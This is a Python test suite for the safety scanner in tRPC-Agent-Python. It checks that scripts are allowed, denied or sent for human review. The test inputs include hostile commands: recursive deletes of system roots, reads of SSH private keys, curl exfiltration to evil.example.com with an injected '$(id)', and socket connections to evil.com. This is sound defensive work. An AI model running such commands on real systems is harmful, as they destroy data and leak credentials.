# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Tests for the scan orchestrator: fusion, must-detect coverage, performance."""

from __future__ import annotations

import time

from trpc_agent_sdk.tools.safety import RiskCategory
from trpc_agent_sdk.tools.safety import RiskLevel
from trpc_agent_sdk.tools.safety import RuleHit
from trpc_agent_sdk.tools.safety import SafetyDecision
from trpc_agent_sdk.tools.safety import SafetyScanner
from trpc_agent_sdk.tools.safety import ScanInput
from trpc_agent_sdk.tools.safety import ScriptLanguage


def _scan(script: str, language: ScriptLanguage = ScriptLanguage.UNKNOWN):
    """Scan ``script`` with the default-policy scanner."""
    return SafetyScanner().scan(ScanInput(script=script, language=language))


# -- decision fusion --------------------------------------------------------
def test_benign_script_is_allowed() -> None:
    """A harmless script produces an allow decision with no hits."""
    report = _scan("print('hello world')\n", ScriptLanguage.PYTHON)
    assert report.decision is SafetyDecision.ALLOW
    assert report.hits == []


def test_critical_hit_forces_deny() -> None:
    """A critical finding forces a deny verdict."""
    report = _scan("rm -rf /\n", ScriptLanguage.BASH)
    assert report.decision is SafetyDecision.DENY
    assert report.risk_level.value == "critical"


def test_medium_only_needs_human_review() -> None:
    """A medium-only finding (dependency install) requires human review."""
    report = _scan("pip install requests\n", ScriptLanguage.BASH)
    assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW


# -- must-detect scenarios (100% required by the issue) ---------------------
def test_secret_read_always_detected() -> None:
    """Reading credential files is blocked in both Python and Bash."""
    bash = _scan("cat ~/.ssh/id_rsa\n", ScriptLanguage.BASH)
    assert bash.decision is SafetyDecision.DENY
    assert "CR001" in bash.rule_ids()

    py = _scan("open('/root/.ssh/id_rsa').read()\n", ScriptLanguage.PYTHON)
    assert py.decision is SafetyDecision.DENY


def test_dangerous_delete_always_detected() -> None:
    """Recursive force-delete of system roots is always blocked."""
    for cmd in ("rm -rf /", "rm -fr /etc", "rm -rf ~", "rm -rf $HOME"):
        report = _scan(cmd + "\n", ScriptLanguage.BASH)
        assert report.decision is SafetyDecision.DENY, cmd


def test_non_whitelisted_egress_always_detected() -> None:
    """Egress to a non-allow-listed domain is always blocked."""
    report = _scan("curl https://evil.example.com/steal\n", ScriptLanguage.BASH)
    assert report.decision is SafetyDecision.DENY
    ids = report.rule_ids()
    assert "SH021" in ids or "NET001" in ids


def test_whitelisted_egress_allowed() -> None:
    """Egress to an allow-listed domain is not blocked."""
    report = _scan("curl https://api.openai.com/v1/models\n", ScriptLanguage.BASH)
    assert report.decision is SafetyDecision.ALLOW


def test_uncertain_egress_downgraded_to_review() -> None:
    """A downloader with an undeterminable destination is reviewed, not allowed."""
    report = _scan('curl "$URL"\n', ScriptLanguage.BASH)
    assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW


def test_unbalanced_quote_curl_still_detected() -> None:
    """An unpaired quote must not hide a downloader egress.

    ``shlex.split`` raises on the unbalanced quote and the bash layer falls back
    to naive splitting, but egress is still caught: domains are extracted from
    the raw line by regex and the NET001 L1 rule matches ``curl`` directly, so
    the non-whitelisted destination is denied.
    """
    report = _scan('curl "https://evil.example.com/$(id)\n', ScriptLanguage.BASH)
    assert report.decision is SafetyDecision.DENY
    ids = report.rule_ids()
    assert "SH021" in ids or "NET001" in ids


def test_whitelisted_line_does_not_mask_other_egress() -> None:
    """Per-line domain resolution: a whitelisted URL must not mask another egress.

    Regression for the global-domain false negative: line 2 targets an
    allow-listed host, but line 3's destination is a variable and cannot be
    verified — it must be reviewed, never silently allowed.
    """
    script = ("import requests\n"
              'requests.get("https://api.openai.com/v1/models")\n'
              "requests.post(exfil_url, data=payload)\n")
    report = _scan(script, ScriptLanguage.PYTHON)
    assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW


def test_same_line_whitelisted_url_does_not_mask_dynamic_egress() -> None:
    """A whitelisted URL literal on the hit line must not unblock a dynamic egress.

    Regression for the single-line masking bypass: the POST destination is a
    variable (unverifiable), but an allow-listed URL sits in ``headers`` on the
    *same* line. Domain-aware refinement would drop the high AST004/NET001 hits
    as "all destinations allow-listed"; the medium AST009 hit must survive so the
    verdict is review, never a silent allow.
    """
    script = ("import requests\n"
              'requests.post(exfil_url, headers={"x": "https://api.openai.com"})\n')
    report = _scan(script, ScriptLanguage.PYTHON)
    assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW
    assert "AST009" in report.rule_ids()


def test_literal_whitelisted_egress_stays_allowed() -> None:
    """A fully-literal allow-listed destination is still allowed (no AST009 noise)."""
    script = ("import requests\n"
              'requests.post("https://api.openai.com/v1/chat", json=payload)\n')
    report = _scan(script, ScriptLanguage.PYTHON)
    assert report.decision is SafetyDecision.ALLOW
    assert "AST009" not in report.rule_ids()


def test_non_url_literal_egress_stays_denied() -> None:
    """A non-whitelisted bare-host literal (no scheme) is denied, not reviewed.

    ``requests.get("evil.com")`` and ``socket.connect(("evil.com", 4444))`` carry
    no ``http(s)://`` URL, but the destination is a verifiable literal host. The
    network refinement must extract it from the quoted string and keep the hit
    high, satisfying "non-whitelisted egress is 100% detected" rather than
    silently downgrading to review.
    """
    for script in (
            'import requests\nrequests.get("evil.com")\n',
            'import socket\nsocket.connect(("evil.com", 4444))\n',
    ):
        report = _scan(script, ScriptLanguage.PYTHON)
        assert report.decision is SafetyDecision.DENY, script


def test_non_url_whitelisted_literal_egress_allowed() -> None:
    """A whitelisted bare-host literal (no scheme) is not blocked."""
    script = 'import requests\nrequests.get("api.openai.com")\n'
    report = _scan(script, ScriptLanguage.PYTHON)
    assert report.decision is SafetyDecision.ALLOW


def test_whitelisted_egress_stays_visible_as_low_trace() -> None:
    """A whitelisted egress is allowed but stays visible as a low advisory trace.

    Refinement must not erase an allow-listed network call from the report: the
    hit is downgraded to LOW (advisory, non-blocking) rather than dropped, so the
    permitted egress remains observable in the audit trail.
    """
    report = _scan('import requests\nrequests.get("api.openai.com")\n', ScriptLanguage.PYTHON)
    assert report.decision is SafetyDecision.ALLOW
    assert report.risk_level.value == "low"
    net_hits = [h for h in report.hits if h.category is RiskCategory.NETWORK_EXFILTRATION]
    assert net_hits, "the permitted egress must remain visible in the report"
    assert any("allow-listed" in h.recommendation for h in net_hits)


def test_overlapping_regex_hit_is_deduped() -> None:
    """A coarse regex hit is dropped when a stronger ast hit covers the same line."""
    report = _scan("import subprocess\nsubprocess.run('ls')\n", ScriptLanguage.PYTHON)
    ids = report.rule_ids()
    assert "AST001" in ids
    assert "PS004" not in ids


# -- redaction --------------------------------------------------------------
def test_secret_evidence_is_redacted() -> None:
    """A hardcoded secret is reported but its value is masked."""
    script = 'api_key = "sk-abcdefghijklmnop1234567890"\n'
    report = _scan(script, ScriptLanguage.PYTHON)
    assert report.redacted is True
    joined = " ".join(hit.evidence for hit in report.hits)
    assert "sk-abcdefghijklmnop1234567890" not in joined
    assert "***" in joined


# -- language detection -----------------------------------------------------
def test_shebang_detected_as_bash() -> None:
    """A shebang line makes the scanner treat the script as Bash."""
    report = _scan("#!/bin/bash\nrm -rf /\n")
    assert report.language is ScriptLanguage.BASH


def test_python_source_autodetected() -> None:
    """Parseable Python with no shell hints is detected as Python."""
    report = _scan("def f(x):\n    return x + 1\n")
    assert report.language is ScriptLanguage.PYTHON


def test_python_with_command_word_literal_not_misdetected_as_bash() -> None:
    """A Python call whose string literal contains ``rm`` stays Python and denies.

    Regression for the language-detection bypass: the bash substring heuristic
    matched ``rm`` inside the Python string literal and short-circuited to Bash,
    skipping the AST layer so the dynamic ``os.system`` spawn was silently
    allowed. Detection must route this to Python, where AST001/AST008 fire.
    """
    for script in ('os.system("rm " + path)\n', 'subprocess.call("rm " + user_input)\n'):
        report = _scan(script)
        assert report.language is ScriptLanguage.PYTHON, script
        assert report.decision is SafetyDecision.DENY, script
        assert "AST001" in report.rule_ids(), script
        assert "AST008" in report.rule_ids(), script


def test_static_python_mentioning_commands_is_allowed_python() -> None:
    """A benign, fully-static Python line mentioning a shell word is still Python.

    The literal ``rm`` trips the bash substring heuristic but no regex rule (it
    lacks the ``-rf`` flag FS001 needs), so this isolates language priority: the
    script must be routed to Python and, having no dangerous call, allowed.
    """
    report = _scan('print("run rm to clean the temp directory")\n')
    assert report.language is ScriptLanguage.PYTHON
    assert report.decision is SafetyDecision.ALLOW


def test_bash_command_parsing_as_python_expression_stays_bash() -> None:
    """A destructive bash command that happens to parse as Python is still Bash.

    ``rm -rf /tmp/x`` satisfies Python's grammar as a subtraction/division of
    names, so a naive "ast.parse first" would misroute it to the Python layer
    and skip FS001. Requiring real Python constructs keeps it on the bash path.
    """
    report = _scan("rm -rf /tmp/data\n")
    assert report.language is ScriptLanguage.BASH
    assert report.decision is SafetyDecision.DENY


# -- performance ------------------------------------------------------------
def test_500_line_script_under_one_second() -> None:
    """Scanning a 500-line script stays well under the 1s budget."""
    lines = []
    for i in range(500):
        lines.append(f"x{i} = compute_value({i}) + offset  # line {i}")
    script = "\n".join(lines) + "\n"

    scanner = SafetyScanner()
    scan_input = ScanInput(script=script, language=ScriptLanguage.PYTHON)

    start = time.perf_counter()
    report = scanner.scan(scan_input)
    elapsed = time.perf_counter() - start

    assert elapsed < 1.0, f"500-line scan took {elapsed:.3f}s"
    # The report's own measurement should also be under budget.
    assert report.duration_ms < 1000.0


# -- report shape -----------------------------------------------------------
def test_report_serialises_to_json() -> None:
    """The report is JSON-serialisable with all required decision fields."""
    report = _scan("rm -rf /\n", ScriptLanguage.BASH)
    data = report.model_dump(mode="json")
    for key in ("decision", "risk_level", "hits", "summary", "recommendation"):
        assert key in data
    assert data["hits"], "a blocking report must carry evidence"
    first = data["hits"][0]
    for key in ("rule_id", "evidence", "recommendation", "risk_level"):
        assert key in first


# -- dedupe / fusion edge cases ---------------------------------------------
def test_duplicate_ast_hit_on_same_line_is_deduped() -> None:
    """Two identical findings on one line collapse to a single hit."""
    report = _scan("eval(a); eval(b)\n", ScriptLanguage.PYTHON)
    ast002 = [hit for hit in report.hits if hit.rule_id == "AST002"]
    assert len(ast002) == 1


def test_fuse_allows_low_severity_only_findings() -> None:
    """Findings that never exceed 'low' are advisory and do not block."""
    low_hit = RuleHit(
        rule_id="LOW1",
        category=RiskCategory.RESOURCE_ABUSE,
        risk_level=RiskLevel.LOW,
        title="advisory",
        evidence="x",
        line=1,
        recommendation="",
        layer="regex",
    )
    decision, peak = SafetyScanner._fuse([low_hit])
    assert decision is SafetyDecision.ALLOW
    assert peak is RiskLevel.LOW


def test_python_shebang_autodetected() -> None:
    """A ``python`` shebang makes the scanner treat the script as Python."""
    report = _scan("#!/usr/bin/env python3\nimport os\n")
    assert report.language is ScriptLanguage.PYTHON


def test_unparseable_non_bash_defaults_to_bash() -> None:
    """Content that is neither valid Python nor shell-hinted falls back to Bash."""
    report = _scan("@@@ not valid @@@\n")
    assert report.language is ScriptLanguage.BASH


def test_script_language_from_str_defaults_to_unknown() -> None:
    """Empty or unrecognised language strings normalise to UNKNOWN."""
    assert ScriptLanguage.from_str(None) is ScriptLanguage.UNKNOWN
    assert ScriptLanguage.from_str("") is ScriptLanguage.UNKNOWN
    assert ScriptLanguage.from_str("ruby") is ScriptLanguage.UNKNOWN
